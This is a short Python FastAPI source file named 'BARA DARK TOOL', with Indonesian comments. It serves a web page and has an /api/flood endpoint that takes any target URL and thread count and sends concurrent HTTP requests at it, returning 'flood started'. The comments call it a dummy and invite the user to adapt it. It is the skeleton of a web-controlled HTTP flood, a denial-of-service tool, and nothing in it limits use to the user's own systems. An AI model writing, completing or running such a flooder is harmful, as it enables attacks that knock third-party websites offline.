from fastapi import FastAPI, Request
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.templating import Jinja2Templates  # optional kalau mau dynamic
import asyncio
import httpx
import random

app = FastAPI(title="BARA DARK TOOL")

# Serve static files (HTML, CSS, JS)
app.mount("/static", StaticFiles(directory="static"), name="static")

@app.get("/", response_class=HTMLResponse)
async def root(request: Request):
    # Bisa pake Jinja kalau mau, tapi langsung return HTML file
    with open("static/index.html", "r") as f:
        html_content = f.read()
    return HTMLResponse(content=html_content, status_code=200)

# Endpoint contoh flood (dummy, ganti sesuai kebutuhan lu)
@app.get("/api/flood")
async def flood(url: str, threads: int = 10, duration: int = 60):
    # Ini dummy flood async pake httpx
    async with httpx.AsyncClient() as client:
        tasks = []
        for _ in range(threads):
            tasks.append(client.get(url))  # Ganti POST atau apa sesuai
        await asyncio.gather(*tasks, return_exceptions=True)
    return {"status": "flood started", "target": url, "threads": threads}

# Jalankan: uvicorn main:app --host 0.0.0.0 --port 8080